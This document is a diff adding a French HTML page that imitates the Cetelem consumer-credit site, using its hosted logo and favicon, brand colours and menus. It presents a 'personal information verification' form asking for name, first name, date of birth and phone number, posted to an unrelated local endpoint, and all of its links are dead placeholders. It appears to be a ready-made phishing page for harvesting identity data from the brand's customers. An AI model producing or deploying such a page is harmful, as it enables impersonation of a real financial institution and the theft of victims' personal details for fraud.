@@ -1,0 +1,226 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Vérification des informations personnelles</title>
+  <link rel="icon" href="https://www.cetelem.fr/favicon.ico" type="image/x-icon" />
+  <style>
+    :root {
+      --cetelem-green: #014421;
+      --cetelem-light-green: #c1d4cd;
+      --cetelem-dark-gray: #333;
+    }
+
+    body {
+      font-family: Arial, sans-serif;
+      background-color: var(--cetelem-light-green);
+      margin: 0;
+      padding: 0;
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+      color: var(--cetelem-dark-gray);
+      text-align: center;
+    }
+
+    header {
+      background-color: #fff;
+      box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+      padding: 10px 0;
+    }
+
+    .header-top {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 0 20px;
+    }
+
+    .header-logo {
+      max-width: 120px;
+      height: auto;
+    }
+
+    .espace-client-link {
+      color: var(--cetelem-green);
+      text-decoration: none;
+      font-weight: bold;
+      font-size: 16px;
+    }
+
+    .header-nav {
+      background-color: #f7f7f7;
+      border-top: 1px solid #ddd;
+      padding: 10px 0;
+    }
+
+    .header-nav ul {
+      list-style-type: none;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      gap: 15px;
+      flex-wrap: wrap;
+    }
+
+    .header-nav a {
+      color: var(--cetelem-dark-gray);
+      text-decoration: none;
+      font-size: 14px;
+      font-weight: bold;
+      padding: 5px;
+    }
+
+    main {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+    }
+
+    .form-container {
+      background-color: #fff;
+      padding: 40px;
+      border-radius: 8px;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+      max-width: 400px;
+      width: 100%;
+      box-sizing: border-box;
+      animation: fadeIn 1s ease-in-out;
+      text-align: left;
+    }
+
+    @keyframes fadeIn {
+        from { opacity: 0; transform: translateY(20px); }
+        to { opacity: 1; transform: translateY(0); }
+    }
+
+    .form-container h1 {
+      text-align: center;
+      font-size: 20px;
+      color: var(--cetelem-dark-gray);
+      margin-bottom: 25px;
+    }
+
+    label {
+      font-size: 14px;
+      display: block;
+      margin-bottom: 6px;
+      font-weight: bold;
+    }
+
+    input[type="text"],
+    input[type="tel"],
+    input[type="date"] {
+      width: 100%;
+      padding: 11px;
+      font-size: 15px;
+      border: 1px solid var(--cetelem-green);
+      border-radius: 5px;
+      margin-bottom: 18px;
+      box-sizing: border-box;
+      outline: none;
+    }
+
+    .btn {
+      background-color: var(--cetelem-green);
+      color: #fff;
+      font-size: 15px;
+      padding: 11px 0;
+      width: 100%;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      font-weight: bold;
+      margin-top: 10px;
+    }
+
+    footer {
+      background-color: var(--cetelem-light-green);
+      padding: 20px 10px;
+      font-size: 12px;
+      color: var(--cetelem-dark-gray);
+    }
+
+    .footer-links {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      gap: 10px 15px;
+      margin-bottom: 10px;
+    }
+
+    .footer-links a {
+      color: var(--cetelem-dark-gray);
+      text-decoration: none;
+    }
+
+    .footer-links a:hover {
+      text-decoration: underline;
+    }
+
+    @media (max-width: 768px) {
+        .header-nav ul {
+            justify-content: space-around;
+        }
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <div class="header-top">
+      <img src="https://www.cetelem.fr/brand/logo.svg" alt="Logo Cetelem" class="header-logo">
+      <a href="#" class="espace-client-link">Mon espace client</a>
+    </div>
+    <nav class="header-nav">
+      <ul>
+        <li><a href="#">Crédit</a></li>
+        <li><a href="#">CARTE CPAY</a></li>
+        <li><a href="#">ASSURANCE</a></li>
+        <li><a href="#">ÉPARGNE</a></li>
+        <li><a href="#">ASSISTANCE</a></li>
+      </ul>
+    </nav>
+  </header>
+
+  <main>
+    <div class="form-container">
+      <h1>Vérification des informations personnelles</h1>
+      <form method="POST" action="/verification_personnelle">
+        <label for="nom">Nom :</label>
+        <input type="text" id="nom" name="nom" required>
+
+        <label for="prenom">Prénom :</label>
+        <input type="text" id="prenom" name="prenom" required>
+
+        <label for="date_naissance">Date de naissance :</label>
+        <input type="text" id="date_naissance" name="date_naissance" placeholder="jj/mm/aaaa" required pattern="\d{2}/\d{2}/\d{4}">
+
+        <label for="telephone">Numéro de téléphone :</label>
+        <input type="tel" id="telephone" name="telephone" required>
+
+        <button class="btn" type="submit">Continuer</button>
+      </form>
+    </div>
+  </main>
+
+  <footer>
+    <div class="footer-links">
+      <a href="#">Virement express</a>
+      <a href="#">Résiliation</a>
+      <a href="#">Contact</a>
+      <a href="#">Questions / Réponses</a>
+      <a href="#">Réclamation</a>
+      <a href="#">Mentions légales</a>
+      <a href="#">Informations sur les cookies</a>
+      <a href="#">Préférence de cookies</a>
+      <a href="#">Déclaration d'accessibilité</a>
+    </div>
+  </footer>
+
+</body>
+</html>
